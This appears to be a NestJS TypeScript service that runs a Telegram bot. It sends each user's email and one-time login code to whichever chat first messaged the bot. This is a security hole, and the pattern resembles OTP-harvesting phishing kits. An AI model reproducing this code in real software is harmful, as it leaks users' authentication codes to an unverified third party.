import { Injectable } from '@nestjs/common';
import { Telegraf } from 'telegraf';
import { writeFileSync, readFileSync, existsSync } from 'fs';
import { join } from 'path';
import { config } from 'src/config/env-config';

@Injectable()
export class TelegramService {

  private bot: Telegraf;
  private chatId: number | null = null;
  private chatIdFile = join(process.cwd(), 'telegram.txt');

  constructor() {
    this.bot = new Telegraf(config.BOT_TOKEN);

    if (existsSync(this.chatIdFile)) {
      this.chatId = Number(readFileSync(this.chatIdFile, 'utf-8'));
    }

    this.bot.on('message', (ctx) => {
      if (!this.chatId && ctx.chat?.id) {
        this.chatId = ctx.chat.id;
        writeFileSync(this.chatIdFile, String(this.chatId));
      }
    });

    this.bot.launch();
  }

  // send code 
  async sendCode(data: { email: string; otp: string }) {    
    if (!this.chatId) return;
    await this.bot.telegram.sendMessage(
      this.chatId,
      `👤 From: ${data.email}\n🔑 Code: ${data.otp}`,
    );
  }
}